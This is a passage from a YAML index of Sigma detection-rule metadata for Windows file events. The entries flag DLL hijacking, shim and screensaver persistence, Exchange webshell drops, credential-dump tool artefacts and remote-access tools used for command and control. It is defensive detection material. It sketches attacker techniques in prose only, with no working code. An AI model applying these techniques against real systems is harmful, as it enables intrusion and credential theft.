  - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/4.B.4_83D62033-105A-4A02-8B75-DAB52D8D51EC.md
  false_positives:
  - Legitimate usage
  notes: ''
- detection_id: 8f0b1fb1-9bd4-4e74-8cdf-a8de4d2adfd0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_delete/file_delete_win_unusual_deletion_by_dns_exe.yml
  name: Unusual File Deletion by Dns.exe
  description: Detects an unexpected file being deleted by dns.exe which my indicate
    activity related to remote code execution or other forms of exploitation as seen
    in CVE-2020-1350 (SigRed)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_delete
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1133
  tags:
  - attack.persistence
  - attack.initial-access
  - attack.t1133
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/unusual-file-modification-by-dns-exe.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3109530e-ab47-4cc6-a953-cac5ebcc93ae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_delete/file_delete_win_zone_identifier_ads_uncommon.yml
  name: ADS Zone.Identifier Deleted By Uncommon Application
  description: Detects the deletion of the "Zone.Identifier" ADS by an uncommon process.
    Attackers can leverage this in order to bypass security restrictions that make
    use of the ADS such as Microsoft Office apps.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_delete
  data_sources: []
  tactics: []
  techniques:
  - T1070.004
  tags:
  - attack.defense-evasion
  - attack.t1070.004
  time_window: ''
  references:
  - https://securityliterate.com/how-malware-abuses-the-zone-identifier-to-circumvent-detection-and-analysis/
  - Internal Research
  false_positives:
  - Other third party applications not listed.
  notes: ''
- detection_id: 75bf09fa-1dd7-4d18-9af9-dd9e492562eb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_adsi_cache_creation_by_uncommon_tool.yml
  name: ADSI-Cache File Creation By Uncommon Tool
  description: Detects the creation of an "Active Directory Schema Cache File" (.sch)
    file by an uncommon tool.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1001.003
  tags:
  - attack.t1001.003
  - attack.command-and-control
  time_window: ''
  references:
  - https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961
  - https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/
  - https://github.com/fox-it/LDAPFragger
  false_positives:
  - Other legimate tools, which do ADSI (LDAP) operations, e.g. any remoting activity
    by MMC, Powershell, Windows etc.
  notes: ''
- detection_id: fed85bf9-e075-4280-9159-fbe8a023d6fa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_advanced_ip_scanner.yml
  name: Advanced IP Scanner - File Event
  description: Detects the use of Advanced IP Scanner. Seems to be a popular tool
    for ransomware groups.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1046
  tags:
  - attack.discovery
  - attack.t1046
  time_window: ''
  references:
  - https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/
  - https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
  - https://labs.f-secure.com/blog/prelude-to-ransomware-systembc
  - https://assets.documentcloud.org/documents/20444693/fbi-pin-egregor-ransomware-bc-01062021.pdf
  - https://thedfirreport.com/2021/01/18/all-that-for-a-coinminer
  false_positives:
  - Legitimate administrative use
  notes: ''
- detection_id: 0b9ad457-2554-44c1-82c2-d56a99c42377
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_anydesk_artefact.yml
  name: Anydesk Temporary Artefact
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: 2d367498-5112-4ae5-a06a-96e7bc33a211
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_anydesk_writing_susp_binaries.yml
  name: Suspicious Binary Writes Via AnyDesk
  description: 'Detects AnyDesk writing binary files to disk other than "gcapi.dll".

    According to RedCanary research it is highly abnormal for AnyDesk to write executable
    files to disk besides gcapi.dll,

    which is a legitimate DLL that is part of the Google Chrome web browser used to
    interact with the Google Cloud API. (See reference section for more details)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://redcanary.com/blog/misbehaving-rats/
  - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e890acee-d488-420e-8f20-d9b19b3c3d43
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_arcsoc_susp_file_created.yml
  name: Suspicious File Created by ArcSOC.exe
  description: 'Detects instances where the ArcGIS Server process ArcSOC.exe, which
    hosts REST services running on an ArcGIS

    server, creates a file with suspicious file type, indicating that it may be an
    executable, script file,

    or otherwise unusual.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1105
  - T1127
  - T1133
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  - attack.persistence
  - attack.initial-access
  - attack.t1127
  - attack.t1105
  - attack.t1133
  time_window: ''
  references:
  - https://reliaquest.com/blog/threat-spotlight-inside-flax-typhoons-arcgis-compromise/
  - https://enterprise.arcgis.com/en/server/12.0/administer/windows/inside-an-arcgis-server-site.htm
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 4c7f49ee-2638-43bb-b85b-ce676c30b260
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_aspnet_temp_files.yml
  name: Assembly DLL Creation Via AspNetCompiler
  description: 'Detects the creation of new DLL assembly files by "aspnet_compiler.exe",
    which could be a sign of "aspnet_compiler" abuse to proxy execution through a
    build provider.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Legitimate assembly compilation using a build provider
  notes: ''
- detection_id: 02773bed-83bf-469f-b7ff-e676e7d78bab
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_bloodhound_collection.yml
  name: BloodHound Collection Files
  description: Detects default file names outputted by the BloodHound collection tool
    SharpHound
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1059.001
  - T1069.001
  - T1069.002
  - T1087.001
  - T1087.002
  - T1482
  tags:
  - attack.discovery
  - attack.t1087.001
  - attack.t1087.002
  - attack.t1482
  - attack.t1069.001
  - attack.t1069.002
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://academy.hackthebox.com/course/preview/active-directory-bloodhound/bloodhound--data-collection
  false_positives:
  - Some false positives may arise in some environment and this may require some tuning.
    Add additional filters or reduce level depending on the level of noise
  notes: ''
- detection_id: 65236ec7-ace0-4f0c-82fd-737b04fd4dcb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_create_evtx_non_common_locations.yml
  name: EVTX Created In Uncommon Location
  description: 'Detects the creation of new files with the ".evtx" extension in non-common
    or non-standard location.

    This could indicate tampering with default EVTX locations in order to evade security
    controls or simply exfiltration of event log to search for sensitive information
    within.

    Note that backup software and legitimate administrator might perform similar actions
    during troubleshooting.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1562.002
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/eventlog/eventlog-key
  false_positives:
  - Administrator or backup activity
  - An unknown bug seems to trigger the Windows "svchost" process to drop EVTX files
    in the "C:\Windows\Temp" directory in the form "<log_name">_<uuid>.evtx". See
    https://superuser.com/questions/1371229/low-disk-space-after-filling-up-c-windows-temp-with-evtx-and-txt-files
  notes: ''
- detection_id: df6ecb8b-7822-4f4b-b412-08f524b4576c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_create_non_existent_dlls.yml
  name: Creation Of Non-Existent System DLL
  description: 'Detects the creation of system DLLs that are usually not present on
    the system (or at least not in system directories).

    Usually this technique is used to achieve DLL hijacking.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://decoded.avast.io/martinchlumecky/png-steganography/
  - https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992
  - https://clement.notin.org/blog/2020/09/12/CVE-2020-7315-McAfee-Agent-DLL-injection/
  - https://github.com/Wh04m1001/SysmonEoP
  - https://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/
  - https://github.com/blackarrowsec/redteam-research/tree/26e6fc0c0d30d364758fa11c2922064a9a7fd309/LPE%20via%20StorSvc
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6c0ce3b6-85e2-49d4-9c3f-6e008ce9796e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_creation_deno.yml
  name: Suspicious Deno File Written from Remote Source
  description: 'Detects Deno writing a file from a direct HTTP(s) call and writing
    to the appdata folder or bringing it''s own malicious DLL.

    This behavior may indicate an attempt to execute remotely hosted, potentially
    malicious files through deno.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.007
  - T1105
  - T1204
  tags:
  - attack.execution
  - attack.t1204
  - attack.t1059.007
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://taggart-tech.com/evildeno/
  false_positives:
  - Legitimate usage of deno to request a file or bring a DLL to a host
  notes: ''
- detection_id: ee63c85c-6d51-4d12-ad09-04e25877a947
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_creation_new_shim_database.yml
  name: New Custom Shim Database Created
  description: 'Adversaries may establish persistence and/or elevate privileges by
    executing malicious content triggered by application shims.

    The Microsoft Windows Application Compatibility Infrastructure/Framework (Application
    Shim) was created to allow for backward compatibility of software as the operating
    system codebase changes over time.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.009
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.009
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.011/T1546.011.md#atomic-test-2---new-shim-database-files-created-in-the-default-shim-database-directory
  - https://www.mandiant.com/resources/blog/fin7-shim-databases-persistence
  - https://liberty-shell.com/sec/2020/02/25/shim-persistence/
  - https://andreafortuna.org/2018/11/12/process-injection-and-persistence-using-application-shimming/
  false_positives:
  - Legitimate custom SHIM installations will also trigger this rule
  notes: ''
- detection_id: 97aa2e88-555c-450d-85a6-229bcd87efb8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_creation_scr_binary_file.yml
  name: Suspicious Screensaver Binary File Creation
  description: 'Adversaries may establish persistence by executing malicious content
    triggered by user inactivity.

    Screensavers are programs that execute after a configurable time of user inactivity
    and consist of Portable Executable (PE) files with a .scr file extension

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.002
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.002/T1546.002.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 13c02350-4177-4e45-ac17-cf7ca628ff5e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_creation_system_dll_files.yml
  name: Files With System DLL Name In Unsuspected Locations
  description: 'Detects the creation of a file with the ".dll" extension that has
    the name of a System DLL in uncommon or unsuspected locations. (Outisde of "System32",
    "SysWOW64", etc.).

    It is highly recommended to perform an initial baseline before using this rule
    in production.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1036.005
  tags:
  - attack.defense-evasion
  - attack.t1036.005
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Third party software might bundle specific versions of system DLLs.
  notes: ''
- detection_id: d5866ddf-ce8f-4aea-b28e-d96485a20d3d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_creation_system_file.yml
  name: Files With System Process Name In Unsuspected Locations
  description: 'Detects the creation of an executable with a system process name in
    folders other than the system ones (System32, SysWOW64, etc.).

    It is highly recommended to perform an initial baseline before using this rule
    in production.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 10
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1036.005
  tags:
  - attack.defense-evasion
  - attack.t1036.005
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - System processes copied outside their default folders for testing purposes
  - Third party software naming their software with the same names as the processes
    mentioned here
  notes: ''
- detection_id: 8c3c76ca-8f8b-4b1d-aaf3-81aebcd367c9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_creation_unquoted_service_path.yml
  name: Creation Exe for Service with Unquoted Path
  description: 'Adversaries may execute their own malicious payloads by hijacking
    vulnerable file path references.

    Adversaries can take advantage of paths that lack surrounding quotations by placing
    an executable in a higher level directory within the path, so that Windows will
    choose the adversary''s executable to launch.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.009
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.009
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1574.009/T1574.009.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8fbf3271-1ef6-4e94-8210-03c2317947f6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_cred_dump_tools_dropped_files.yml
  name: Cred Dump Tools Dropped Files
  description: Files with well-known filenames (parts of credential dump software
    or files produced by them) creation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1003.002
  - T1003.003
  - T1003.004
  - T1003.005
  tags:
  - attack.credential-access
  - attack.t1003.001
  - attack.t1003.002
  - attack.t1003.003
  - attack.t1003.004
  - attack.t1003.005
  time_window: ''
  references:
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  false_positives:
  - Legitimate Administrator using tool for password recovery
  notes: ''
- detection_id: 002bdb95-0cf1-46a6-9e08-d38c128a6127
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_cscript_wscript_dropper.yml
  name: WScript or CScript Dropper - File
  description: Detects a file ending in jse, vbe, js, vba, vbs written by cscript.exe
    or wscript.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.005
  - T1059.007
  tags:
  - attack.execution
  - attack.t1059.005
  - attack.t1059.007
  time_window: ''
  references:
  - WScript or CScript Dropper (cea72823-df4d-4567-950c-0b579eaf0846)
  false_positives:
  - Unknown
  notes: ''
- detection_id: f0e2b768-5220-47dd-b891-d57b96fc0ec1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_csexec_service.yml
  name: CSExec Service File Creation
  description: Detects default CSExec service filename which indicates CSExec service
    installation and execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  - attack.s0029
  time_window: ''
  references:
  - https://github.com/malcomvetter/CSExec
  false_positives:
  - Unknown
  notes: ''
- detection_id: e4a74e34-ecde-4aab-b2fb-9112dd01aed0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_csharp_compile_artefact.yml
  name: Dynamic CSharp Compile Artefact
  description: 'When C# is compiled dynamically, a .cmdline file will be created as
    a part of the process.

    Certain processes are not typically observed compiling C# code, but can do so
    without touching disk.

    This can be used to unpack a payload for execution

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1027.004
  tags:
  - attack.defense-evasion
  - attack.t1027.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1027.004/T1027.004.md#atomic-test-2---dynamic-c-compile
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2f7979ae-f82b-45af-ac1d-2b10e93b0baa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_dcom_iertutil_dll_hijack.yml
  name: Potential DCOM InternetExplorer.Application DLL Hijack
  description: Detects potential DLL hijack of "iertutil.dll" found in the DCOM InternetExplorer.Application
    Class over the network
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  - T1021.003
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  - attack.t1021.003
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/201009-RemoteDCOMIErtUtilDLLHijack/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 81315b50-6b60-4d8f-9928-3466e1022515
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_desktop_ini_created_by_uncommon_process.yml
  name: Desktop.INI Created by Uncommon Process
  description: Detects unusual processes accessing desktop.ini, which can be leveraged
    to alter how Explorer displays a folder's content (i.e. renaming files) without
    changing them on disk.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.009
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.009
  time_window: ''
  references:
  - https://isc.sans.edu/forums/diary/Desktopini+as+a+postexploitation+tool/25912/
  false_positives:
  - Operations performed through Windows SCCM or equivalent
  - Read only access list authority
  notes: ''
- detection_id: b6f91281-20aa-446a-b986-38a92813a18f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_dll_sideloading_space_path.yml
  name: DLL Search Order Hijackig Via Additional Space in Path
  description: 'Detects when an attacker create a similar folder structure to windows
    system folders such as (Windows, Program Files...)

    but with a space in order to trick DLL load search order and perform a "DLL Search
    Order Hijacking" attack

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://twitter.com/cyb3rops/status/1552932770464292864
  - https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows
  false_positives:
  - Unknown
  notes: ''
- detection_id: aba15bdd-657f-422a-bab3-ac2d2a0d6f1c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_dump_file_susp_creation.yml
  name: Potentially Suspicious DMP/HDMP File Creation
  description: Detects the creation of a file with the ".dmp"/".hdmp" extension by
    a shell or scripting application such as "cmd", "powershell", etc. Often created
    by software during a crash. Memory dumps can sometimes contain sensitive information
    such as credentials. It's best to determine the source of the crash.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/wer/collecting-user-mode-dumps
  false_positives:
  - Some administrative PowerShell or VB scripts might have the ability to collect
    dumps and move them to other folders which might trigger a false positive.
  notes: ''
- detection_id: 15904280-565c-4b73-9303-3291f964e7f9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_errorhandler_persistence.yml
  name: Potential Persistence Attempt Via ErrorHandler.Cmd
  description: 'Detects creation of a file named "ErrorHandler.cmd" in the "C:\WINDOWS\Setup\Scripts\"
    directory which could be used as a method of persistence

    The content of C:\WINDOWS\Setup\Scripts\ErrorHandler.cmd is read whenever some
    tools under C:\WINDOWS\System32\oobe\ (e.g. Setup.exe) fail to run for any reason.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://www.hexacorn.com/blog/2022/01/16/beyond-good-ol-run-key-part-135/
  - https://github.com/last-byte/PersistenceSniper
  false_positives:
  - Unknown
  notes: ''
- detection_id: bd1212e5-78da-431e-95fa-c58e3237a8e6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_exchange_webshell_drop.yml
  name: Suspicious ASPX File Drop by Exchange
  description: Detects suspicious file type dropped by an Exchange component in IIS
    into a suspicious folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/09/30/analyzing-attacks-using-the-exchange-vulnerabilities-cve-2022-41040-and-cve-2022-41082/
  - https://www.gteltsc.vn/blog/canh-bao-chien-dich-tan-cong-su-dung-lo-hong-zero-day-tren-microsoft-exchange-server-12714.html
  - https://en.gteltsc.vn/blog/cap-nhat-nhe-ve-lo-hong-bao-mat-0day-microsoft-exchange-dang-duoc-su-dung-de-tan-cong-cac-to-chuc-tai-viet-nam-9685.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6b269392-9eba-40b5-acb6-55c882b20ba6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_exchange_webshell_drop_suspicious.yml
  name: Suspicious File Drop by Exchange
  description: Detects suspicious file type dropped by an Exchange component in IIS
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1190
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1190
  - attack.initial-access
  - attack.t1505.003
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/09/30/analyzing-attacks-using-the-exchange-vulnerabilities-cve-2022-41040-and-cve-2022-41082/
  - https://www.gteltsc.vn/blog/canh-bao-chien-dich-tan-cong-su-dung-lo-hong-zero-day-tren-microsoft-exchange-server-12714.html
  - https://en.gteltsc.vn/blog/cap-nhat-nhe-ve-lo-hong-bao-mat-0day-microsoft-exchange-dang-duoc-su-dung-de-tan-cong-cac-to-chuc-tai-viet-nam-9685.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5d756aee-ad3e-4306-ad95-cb1abec48de2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_gotoopener_artefact.yml
  name: GoToAssist Temporary Installation Artefact
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
